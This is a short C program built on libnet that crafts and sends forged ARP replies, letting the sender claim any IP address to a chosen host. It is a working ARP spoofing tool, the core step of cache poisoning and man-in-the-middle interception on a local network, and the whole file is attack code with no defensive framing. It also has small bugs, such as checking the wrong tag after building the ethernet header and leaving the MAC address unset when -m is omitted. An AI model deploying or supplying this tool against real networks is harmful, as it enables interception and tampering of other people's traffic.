#include <libnet.h>
#include <unistd.h>
#include <stdio.h>

/* usage */
void
usage (char *name)
{
  printf ("%s - Send arbitrary ARP replies\n", name);
  printf ("Usage: %s [-i interface] -s ip_address -t dest_ip\n", name);
  printf ("    -i    interface to send on\n");
  printf ("    -s    IP address we are claiming to be\n");
  printf ("    -t    IP address of recipient\n");
  printf ("    -m    Ethernet MAC address of recipient\n");
  exit (1);
}

int main(int argc, char *argv[]) {
	libnet_t *context; // Libnet context
	char errbuf[LIBNET_ERRBUF_SIZE]; // Error messages
	
	in_addr_t ipaddr, destaddr; // Source and destination ip addresses
	u_int8_t *macaddr; // Destination MAC address
	struct libnet_ether_addr *hwaddr; // Source MAC address
	libnet_ptag_t arp = 0; // ARP protocol tag
	
	libnet_ptag_t eth = 0; // Ethernet protocol tag
	
	char *device = NULL; // Network device
	int opt; // For option processing
	int r; // Length return value for libnet_hex_aton

	/* ----------------- String Parsing --------------------- */
	if (argc < 3) {
                usage(argv[0]);
        }

	while ((opt = getopt(argc, argv, "i:t:s:m:")) != -1) {
		switch(opt) {
			// Interface to send on, use as device
			case 'i':
				device = optarg;
				break;
			// IP addr we are claiming to be
			case 's':
				if ((ipaddr = inet_addr(optarg)) == -1) {
					printf("Invalid clained IP address\n");
					usage(argv[0]);
				}
				break;
			// IP addr we are sending to
			case 't':
				if ((destaddr = inet_addr(optarg)) == -1) {
					printf("Invalid destination address\n");
					usage(argv[0]);
				}
				break;
			// MAC address of recipient
			case 'm':
				if ((macaddr = libnet_hex_aton(optarg, &r)) == NULL) {
					printf("Error on MAC address\n");
					usage(argv[0]);
				}
				printf("MAC address parsed successfully\n");
				break;
			default:
				// usage(argv[0]);
				break;
		}
	}

	// Create the libnet environment
	context = libnet_init(LIBNET_LINK, NULL, errbuf);
	if (context == NULL) {
		printf("Error opening context: %s\n", errbuf);
		exit(1);
	}

	// Get the mac address of our local network card
        hwaddr = libnet_get_hwaddr(context);
        if (hwaddr == NULL) {
                printf("Error opening context: %s\n", errbuf);
		exit(1);
        }

	// Build the arp header
	arp = libnet_autobuild_arp(
		ARPOP_REPLY, // Operation
		(u_int8_t *) hwaddr, // Source HW addr
		(u_int8_t *) &ipaddr, // Source protocol address
		macaddr, // Target HW addr
		(u_int8_t *) &destaddr, // Target protocol addr
		context		// Libnet context
	);
	if (arp == -1) {
		printf("Error building the ARP packet\n");
		exit(1);
	}

	// Build the ethernet header
	eth = libnet_build_ethernet(
			macaddr, // Destination address
			(u_int8_t *) hwaddr, // Source address
			ETHERTYPE_ARP, // Type of encapsulated packet
			NULL, // Pointer to payload
			0, // Size of payload
			context, // Libnet context
			0 // Libnet protcol tag
		);
	if (arp == -1) {
		printf("Error building the ethernet header\n");
		exit(1);
	}

	// Write the packet
	if ((libnet_write(context)) == -1) {
		printf("Unable to send packet: %s\n", libnet_geterror(context));
		exit(1);
	}

	// Cleanup
	libnet_destroy(context);
	return 0;
}
